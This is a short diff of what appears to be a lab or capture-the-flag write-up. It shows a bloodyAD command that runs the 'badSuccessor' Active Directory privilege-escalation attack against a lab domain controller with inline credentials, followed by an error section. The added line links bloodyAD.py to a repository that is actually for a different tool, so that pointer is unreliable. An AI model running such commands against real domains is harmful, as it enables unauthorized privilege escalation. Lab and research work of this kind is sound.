@@ -21,6 +21,8 @@ Command:
 python3 bloodyAD.py --host dc01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' add badSuccessor danila -t 'CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb' --ou 'OU=Employees,DC=checkpoint,DC=htb'
 ```
 
+The `bloodyAD.py` you can found [here](https://github.com/dirkjanm/BloodHound.py.git)
+
 Error:
 
 ```text
